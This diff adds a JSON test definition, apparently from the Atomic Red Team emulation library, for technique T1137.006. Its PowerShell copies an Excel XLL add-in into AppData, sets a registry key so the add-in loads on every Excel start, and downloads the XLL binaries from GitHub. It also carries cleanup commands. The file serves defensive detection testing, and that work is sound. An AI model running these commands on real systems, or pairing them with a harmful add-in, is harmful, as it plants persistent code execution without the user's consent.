@@ -1,0 +1,35 @@
+{
+    "name": "Persistent Code Execution Via Excel Add-in File (XLL)",
+    "description": "Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started The sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "powershell",
+        "command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n",
+        "cleanup_command": "$ver = (New-Object -COMObject \"Excel.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\" -ErrorAction Ignore\n",
+        "type": "Command Executor"
+    },
+    "id": "T1137.006",
+    "tactics": [
+        "Persistence"
+    ],
+    "technique": "Add-ins",
+    "source": "ART",
+    "uuid": "9c307886-9fef-41d5-b344-073a0f5b2f5f",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Microsoft Excel must be installed\n",
+            "prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
+            "get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
+        },
+        {
+            "description": "XLL files must exist on disk at specified location",
+            "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\""
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
